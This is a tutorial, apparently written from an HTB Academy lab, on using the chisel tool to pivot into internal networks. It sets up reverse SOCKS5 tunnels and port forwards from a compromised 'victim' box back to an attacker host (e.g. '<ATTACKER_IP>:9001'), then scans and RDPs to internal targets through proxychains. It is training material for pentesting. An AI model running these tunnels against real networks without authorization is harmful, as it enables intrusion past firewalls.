# Chisel Tunneling Tutorial (SOCKS Proxy over HTTP Tunnel) 

### This is going to be a guide for chisel using HTB Academy module. I found that chisel and understanding it can be very useful in real world or the HTB Pro Labs. 

## What is Chisel?

Chisel is a fast TCP tunnel over HTTP, useful for:

+ Pivoting into internal networks

+ SOCKS5 proxying over compromised hosts

+ Bypassing firewalls/NAT (HTTP(S) tunnels are rarely blocked)

 > Think of it like SSH tunneling, but with SOCKS, less overhead, and runs over HTTP.

 > For more information on Chisel, check out the [official GitHub repository](https://github.com/jpillora/chisel).


## Downloading Chisel

You can grab chisel from the github repository:

`git clone https://github.com/jpillora/chisel.git`

or using proper versions for example:

`wget https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz`

> Depending on the version of the glibc library installed on both (target and workstation) systems, discrepancies may exist that could result in an error. When this happens, it is important to 
compare the versions of the library on both systems, or we can use an older prebuilt version of chisel, which can be found in the Releases section of the GitHub repository.

## Building Chisel Binary

`go build` in the chisel directory. 

## Basic Architecture
```
┌────────────┐       HTTP Tunnel       ┌──────────────┐       ┌────────────┐
│ Attacker   │  <------------------->  │  Victim Box  │ <---> │ Internal   │
│ (Chisel    │                        │ (Chisel      │       │ Network    │
│  Server)   │                        │  Client)     │       │ Target     │
└────────────┘                        └──────────────┘       └────────────┘
```

## Example through Lab Environment

> Note we should have access to the victim box. In the example we have credentials and log on to the victims box

1. To transfer the downloaded chisel to the victim box use `scp`:

<img width="958" height="132" alt="image" src="https://github.com/user-attachments/assets/2efcb11c-6c89-478e-9ea1-cd2cb7935c8f" />

2. On the Victims box -  1) make the Chisel binary executable 2) start the service

<img width="1319" height="263" alt="image" src="https://github.com/user-attachments/assets/0c6156e6-ab49-4653-bd0f-c1d8a50b0967" />

3. Configure Proxychains (On Attack Box) by editing the `/etc/proxychains.conf` with the following lines at the bottom:

<img width="952" height="195" alt="image" src="https://github.com/user-attachments/assets/df116adf-bb91-4b8c-9402-b56fe287e802" />

4. Start Chisel Server (On Attacker Machine)
 
<img width="1324" height="355" alt="image" src="https://github.com/user-attachments/assets/c2b5da84-ba09-4533-9301-9e80cd0ca736" />

RESULTS SHOULD LOOK SOMETHING LIKE THIS TO BE SUCCESSFUL:

ATTACKER MACHINE
<img width="1162" height="271" alt="image" src="https://github.com/user-attachments/assets/41b3f400-ed2e-4ed3-b582-a677ccadb033" />
VICTIM MACHINE
<img width="1907" height="596" alt="image" src="https://github.com/user-attachments/assets/4d7d6df4-8b9e-4d41-89f0-f8ea0e8eb10e" />

5. Use Proxychains to Access Internal Targets

Example:  `proxychains nmap -Pn -p3389 172.16.5.19`

Example:  `proxychains curl http://172.16.5.10/`

(Make sure to append `proxychains`) 

In our example challenge we need to remote into the internal target. 
This will be done as so: 


<img width="1922" height="742" alt="image" src="https://github.com/user-attachments/assets/d9a8e19b-9c53-486a-b29c-ebb61de3243a" />

## Further Help 

OPTIONAL:  Reverse Port Forward (Static Port Tunnels)

```
# Forward victim port 3389 (RDP) to attacker port 3389
# Attacker (Server)
./chisel server -p 9002 --reverse

# Victim (Client)
./chisel client 10.10.14.42:9002 R:3389:127.0.0.1:3389
```
Then you can: 

```
xfreerdp /v:127.0.0.1 /u:admin /p:password123
```

Troubleshooting: 

| Problem                          | Fix                                                     |
| -------------------------------- | ------------------------------------------------------- |
| `Unsupported SOCKS version: [4]` | You are using SOCKS4 in proxychains; change to `socks5` |
| Can't connect to attacker        | Check port 9001 is open; use `nc -lvnp 9001` to confirm |
| Nothing works over proxychains   | Use `proxychains -f /path/to/custom.conf` to be sure    |
| `conn#1: Close` immediately      | Target service may be down or IP is wrong               |


One Liners: 

Chisel Server (Attacker)
```./chisel server -p 9001 --socks5```

Chisel Client (Victim)
```./chisel client <ATTACKER_IP>:9001 socks```

Proxychains Config
```socks5 127.0.0.1 1080```

Use
```proxychains ...```

---

## Conclusion

With `chisel`, you can easily pivot into internal networks using SOCKS5 tunnels over HTTP, bypass firewalls, and proxy tools like `nmap`, `xfreerdp`, and `curl`. This setup is extremely useful in CTFs, red teaming, and real-world pentests.

For more information, check out the [official Chisel GitHub repository](https://github.com/jpillora/chisel).

>  Feel free to open an issue or PR if you spot any mistake.

Happy hacking!











